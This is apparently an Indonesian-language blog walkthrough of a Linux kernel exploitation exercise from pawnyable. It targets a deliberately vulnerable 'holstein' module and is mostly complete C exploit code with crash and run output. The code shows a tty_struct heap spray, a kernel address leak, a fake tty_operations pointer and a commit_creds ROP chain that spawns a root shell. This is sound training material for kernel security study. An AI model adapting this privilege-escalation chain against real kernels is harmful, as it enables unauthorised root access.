---
title: "Linux Kernel PWN: Heap Overflow"
date: 2024-08-14 00:00:00 + 0800
tags: [pwn]
categories: [linux-kernel-pwn]
---

Introduction
---

Pada tulisan kali ini, setelah kita sebelumnya belajar tentang cara memanfaatkan ```heap leaked```, kali ini kita akan mempraktekannya dari tantangan pwn langsung yang disediakan oleh <a href="https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html">pawnyable</a> anda bisa langsung mengunduhnya <a href="https://pawnyable.cafe/linux-kernel/LK01/distfiles/LK01-2.tar.gz">holstein v-2</a> kode sumber tersedia didalamnya.

---

Analisa kerentanan
---

Pada fungsi ```module_open()```, variable global ```g_buf``` dialokasikan menggunakan kmalloc dengan ukuran 0x400 byte:

```c
...
g_buf = kmalloc(BUFFER_SIZE, GFP_KERNEL);
  if (!g_buf) {
    printk(KERN_INFO "kmalloc failed");
    return -ENOMEM;
  }
...
```
pada fungsi ```module_read```, variable ```g_buf``` langsung dikirim ke pengguna  menggunakan ```copy_to_user```, namun untuk ukuran tidak ada pemeriksaan terlebih dahulu. yang artinya kita bisa melakukan pembacaan diluar batas:

```c
...
if (copy_to_user(buf, g_buf, count)) {
    printk(KERN_INFO "copy_to_user failed\n");
    return -EINVAL;
  }
...
```

begitu juga dengan fungsi ```module_write``` tidak ada pemeriksaan ukuran yang memungkinkan kita untuk menulis diluar batas:

```c
...
if (copy_from_user(g_buf, buf, count)) {
    printk(KERN_INFO "copy_from_user failed\n");
    return -EINVAL;
  }
...
```

Ukuran buffer yang dialokasikan pada ```g_buf``` adalah 0x400 yang artinya akan ditempatkan di kmalloc-1024, periksa ```/pro/slabinfo``` untuk mengetahui lebih lanjut. untuk memanfaatkan hal ini, kita perlu objek kernel lain yang ditempatkan pada wadah kmalloc-1024 juga. kandidat yang cocok adalah objek ```tty_struct``` yang anda bisa periksa <a href="https://elixir.bootlin.com/linux/v5.15/source/include/linux/tty.h#L143">tty.h</a>, kita bisa menggunakan ```open(/dev/ptmx/)``` untuk mengalokasikan ```tts_struct```.

---

Exploiting
---

pertama, saya menyemprotkan banyak ```ptmx``` setelah membuka perangkat, lalu melakukan pembacaan sembarang dengan kode berikut:

```c
...
void leak()
{
     int fd_spray[100];
    
    for(int i=0; i < 50;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	global_fd = open("/dev/holstein",O_RDWR);
	for(int i=50; i < 100;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}

    memset(buff,'A', 0x500);
    read(global_fd,buff,0x500);

    for(int i=0; i < 0x500; i++){
        printf("0x%x = 0x%016lx\n" ,i, *(unsigned long*)(buff + i));
    }    

}
...

```
dan ini hasil yang didapat, periksa pada output yang dihasilkan dari perulangan:

```bash
...
0x400 = 0x0000000100005401 
0x418 = 0xffffffff81c38880 -> tty_ops
0x438 = 0xffff888003102438 -> g_buf

...
```

tepat setelah 0x400 byte, kita berhasil membocorkan alamat dari ```tty_ops``` dan variable global dari module yang rentan tersebut yaitu ```g_buf```,  offset ```0x0000000100005401``` ini nantinya kita akan timpa untuk mengontrol RIP dengan cara ROP untuk mencapai root. tapi tidak semudah itu.

mengurangi ```tty_ops``` dengan ```0xc38880``` akan kita mendapatkan basis kernel
```c
...
g_buf = *(unsigned long*)(buff + 0x438) - 0x38;
tty_ops = *(unsigned long *)(buff + 0x418);
kbase = tty_ops - 0xc38880;
printf("tty_ops: 0x%016lx\n" ,tty_ops);
printf("kernel base: 0x%016lx\n" ,kbase);
printf("g_buf : 0x%016lx\n" ,g_buf);
...
```
ketika menjalankannya lagi didalam qemu, ini yang didapatkan:

```bash
...
/ # ./exploit
perangkat terbuka
tty_ops: 0xffffffff81c38880
kernel base: 0xffffffff81000000
g_buf : 0xffff888003436400
...
```
Untuk selanjutnya, kita akan melakukan penulisan diluar batas sekaligus melakukan ROP untuk menguji eksploit kita, karena ```tty_operation``` tidak memiliki penunjuk fungsi secara langsung, jadi kita harus menggunakan penunjuk fungsi palsu agar dapat mengontrol RIP dengan melakukan operasi yang sesuai pada file yang ditulis ulang , tapi kita tidak tahu penunjuk fungsi tersebut belum kita ketahui, kita akan membuat tabel agar kita tahu pada offset keberapa kita bisa menimpa ```tty_ops``` dengan offset palsu, ini kodenya :



```c
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>


#define ERR(msg) ({             \
            perror(msg);        \
            exit(EXIT_FAILURE); \
})

unsigned long user_rsp, user_cs, user_ss, user_rflags;
unsigned long tty_ops, g_buf, kbase;
int global_fd;

unsigned long commit_creds;
unsigned long prepare_kernel_cred;
unsigned long pop_rdi;
unsigned long pop_rcx;
unsigned long swapgs;
unsigned long mov_rdi_rax_rep;
char buff[0x500];

void save_state()
{
    asm(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
       );
    puts("[+] save state");
}

void shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    puts("ROOOOT");
    execve("/bin/sh",argv,envp);
}
void leak()
{
    int fd_spray[100];
    
    for(int i=0; i < 50;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	global_fd = open("/dev/holstein",O_RDWR);
	for(int i=50; i < 100;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}

    memset(buff,'A', 0x500);
    read(global_fd,buff,0x500);

    /*for(int i=0; i < 0x500; i++){
        printf("0x%x = 0x%016lx\n" ,i, *(unsigned long*)(buff + i));
    }*/
    g_buf = *(unsigned long*)(buff + 0x438) - 0x438;
    tty_ops = *(unsigned long *)(buff + 0x418);
    kbase = tty_ops - 0xc38880;
    pop_rdi = kbase + 0x0d748d;
    pop_rcx = kbase + 0x13c1c4;
    commit_creds = kbase + 0x0744b0;
    prepare_kernel_cred = kbase + 0x074650;
    mov_rdi_rax_rep = kbase + 0x62707b;
    swapgs = kbase + 0x800e26;
    printf("tty_ops: 0x%016lx\n" ,tty_ops);
    printf("kernel base: 0x%016lx\n" ,kbase);
    printf("k_buf : 0x%016lx\n" ,g_buf);

    unsigned long *p = (unsigned long *)&buff;
    printf("ptr: 0x%016lx\n" ,*p);

    for (int i = 0; i < 0x40; i++) {
        *p++ = 0xffffffffdead0000 + (i << 8);
    }
    *(unsigned long*)&buff[0x418] = g_buf;
    write(global_fd, buff, 0x420);

    for (int i = 0; i < 100; i++) {
        ioctl(fd_spray[i], 0xdeadbeef, 0xcafebabe);
    }
}


int main()
{
    save_state();

    leak();



    return EXIT_SUCCESS;
}

```

saat menjalankan kode diatas, qemu menjadi crash karena register RIP mencoba mengakses address yang salah:

```bash
...
[ Holstein v2 (KL01-2) - Pawnyable ]
/ # ./exploit
[+] save state
tty_ops: 0xffffffff81c38880
kernel base: 0xffffffff81000000
k_buf : 0xffff888003d0e000
ptr: 0xcccccccccccccccc
BUG: unable to handle page fault for address: ffffffffdead0c00
#PF: supervisor instruction fetch in kernel mode
#PF: error_code(0x0010) - not-present page
PGD 1e0d067 P4D 1e0d067 PUD 1e0f067 PMD 0 
Oops: 0010 [#1] SMP PTI
CPU: 0 PID: 162 Comm: exploit Tainted: G           O      5.15.0 #1
Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/014
RIP: 0010:0xffffffffdead0c00
Code: Unable to access opcode bytes at RIP 0xffffffffdead0bd6.
RSP: 0018:ffffc9000013fe10 EFLAGS: 00000286
RAX: ffffffffdead0c00 RBX: ffff888003d0e800 RCX: 00000000deadbeef
RDX: 00000000cafebabe RSI: 00000000deadbeef RDI: ffff888003d0e400
RBP: ffffc9000013fea8 R08: 00000000cafebabe R09: 0000000000000000
R10: 0000000000000000 R11: 0000000000000000 R12: 00000000deadbeef
R13: ffff888003d0e400 R14: 00000000cafebabe R15: ffff888003cdd800
FS:  00000000004ba380(0000) GS:ffff888003200000(0000) knlGS:0000000000000000
CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
CR2: ffffffffdead0bd6 CR3: 0000000003bd4000 CR4: 00000000003006f0
...
```
crash pada alamat yang salah ```ffffffffdead0c00```, 0xc dalam alamat itu == 12. itu berarti kita bisa membuat penunjuk fungsi palsu untuk ```tty_ops``` pada offset ke 12 agar RIP bisa mengeksekusi rantai ROP kita hingga mendapatkan akses root, kita ubah bagian kodenya:

```c
...
unsigned long *p = (unsigned long *)&buff[0x400];
p[12] = kbase + 0x3a478a; //rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp
*(unsigned long*)(buff + 0x418) = g_buf + 0x400;
printf("heap overwrite: 0x%016lx\n" ,*p);
printf("fake pointer function: 0x%016lx\n" ,p[0xc]);
printf("fake tty_operation: 0x%016lx\n" ,*(unsigned long*)(buff + 0x418));
...
```
ini adalah kode epxloit terakhirnya:

```c
#include<stdio.h>
#include<stdlib.h>
#include<fcntl.h>
#include<unistd.h>
#include<string.h>
#include<sys/ioctl.h>


#define ERR(msg) ({             \
            perror(msg);        \
            exit(EXIT_FAILURE); \
})

unsigned long user_rsp, user_cs, user_ss, user_rflags;
unsigned long tty_ops, g_buf, kbase;
int global_fd;

unsigned long commit_creds;
unsigned long prepare_kernel_cred;
unsigned long pop_rdi;
unsigned long pop_rcx;
unsigned long swapgs;
unsigned long mov_rdi_rax_rep;
char buff[0x500];

void save_state()
{
    asm(
            ".intel_syntax noprefix;"
            "mov user_cs, cs;"
            "mov user_ss, ss;"
            "mov user_rsp, rsp;"
            "pushf;"
            "pop user_rflags;"
            ".att_syntax;"
       );
    puts("[+] save state");
}

void shell()
{
    char *argv[] = {"/bin/sh",NULL};
    char *envp[] = {NULL};
    puts("ROOOOT");
    execve("/bin/sh",argv,envp);
}

int main()
{
    save_state();

    int fd_spray[100];
    
    for(int i=0; i < 50;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}
	global_fd = open("/dev/holstein",O_RDWR);
	for(int i=50; i < 100;i++){
		fd_spray[i] = open("/dev/ptmx", O_RDONLY|O_NOCTTY);
		if(fd_spray[i]==-1){
			perror("/dev/ptmx");
			exit(EXIT_FAILURE);
		}
	}

    memset(buff,'A', 0x500);
    read(global_fd,buff,0x500);

    for(int i=0;i<0x480 / 8;i++){
		//printf("leaked = 0x%016lx\n" ,*(unsigned long*)(buff + i * 8));
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x880){
			tty_ops = *(unsigned long*)(buff + i * 8);
			continue;
		}
		if((*(unsigned long*)(buff + i * 8) & 0xfff) == 0x438){
			g_buf = *(unsigned long*)(buff + i * 8) - 0x438;
			break;
		}
	}
    //tty_ops = *(unsigned long*)(buff + 0x418);
    //g_buf = *(unsigned long*)(buff + 0x438) - 0x438;
    kbase = tty_ops - 0xc38880;
    pop_rdi = kbase + 0x0d748d;
    pop_rcx = kbase + 0x13c1c4;
    commit_creds = kbase + 0x0744b0;
    prepare_kernel_cred = kbase + 0x074650;
    mov_rdi_rax_rep = kbase + 0x62707b;
    swapgs = kbase + 0x800e26;
    printf("tty_ops: 0x%016lx\n" ,tty_ops);
    printf("kernel base: 0x%016lx\n" ,kbase);
    printf("k_buf : 0x%016lx\n" ,g_buf);

    unsigned long *p = (unsigned long *)&buff[0x400];
    p[12] = kbase + 0x3a478a; //rop_push_rdx_mov_ebp_415bffd9h_pop_rsp_r13_rbp
    *(unsigned long*)(buff + 0x418) = g_buf + 0x400;
    printf("heap overwrite: 0x%016lx\n" ,*p);
    printf("fake pointer function: 0x%016lx\n" ,p[12]);
    printf("fake tty_operation: 0x%016lx\n" ,*(unsigned long*)(buff + 0x418));

    unsigned long *rop = (unsigned long*)&buff;
    *rop++ = pop_rdi;
    *rop++ = 0;
    *rop++ = prepare_kernel_cred;
    *rop++ = pop_rcx;
    *rop++ = 0;
    *rop++ = mov_rdi_rax_rep;
    *rop++ = commit_creds;
    *rop++ = swapgs;
    *rop++ = 0xdeadbeef;
    *rop++ = 0xdeadbeef;
    *rop++ = (unsigned long)shell;
    *rop++ = user_cs;
    *rop++ = user_rflags;
    *rop++ = user_rsp;
    *rop++ = user_ss;

    write(global_fd, buff,0x500);

    for(int i = 0; i < 100; i++){
        ioctl(fd_spray[i], 0xdeadbeef, g_buf - 0x10); //pop rsp r13 rbp
    }

    return EXIT_SUCCESS;
}

```
<img src="{{ site.url }}{{ site.baseurl }}/images/kernel-pwn-heap-overflow-root.jpg" alt="">

---

Referensi
---

<a href="https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html">https://pawnyable.cafe/linux-kernel/LK01/heap_overflow.html</a>

<a href="https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md">https://github.com/smallkirby/kernelpwn/blob/master/technique/tty_struct.md</a>

---